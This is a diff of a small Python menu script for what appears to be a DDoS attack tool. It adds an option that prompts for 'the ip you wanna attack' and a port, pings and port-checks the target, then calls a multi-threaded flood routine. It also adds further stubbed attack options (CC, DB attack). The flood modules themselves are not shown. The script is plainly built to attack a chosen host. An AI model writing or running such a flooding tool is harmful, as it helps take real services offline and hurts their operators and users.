@@ -1,6 +1,6 @@
-
 import udpflood
 import tool
+import push
 
 tool.surface()
 choose = input("Please input your choose:")  # todo 校验输入
@@ -16,12 +16,20 @@ if choose == "1":
     udpflood.udpfloods(ipright, port, usertime)  # todo string转
 elif choose == "2":
     # todo ddos
-    input()
+    ip = input("Please input the ip you wanna attack：")
+    port = input("Please input the port you wanna attack：")
+    ipright = tool.check_ip(ip)
+    tool.ping(ipright)
+    tool.testport(ipright, port)
+    push.more_thread(ipright, port)#todo 進度條
 elif choose == "3":
     # todo cc
     input()
 elif choose == "4":
     # todo DBattack
+    input()
+elif choose == "5":
+    # todo ddos
     input()
 else:
     quit()
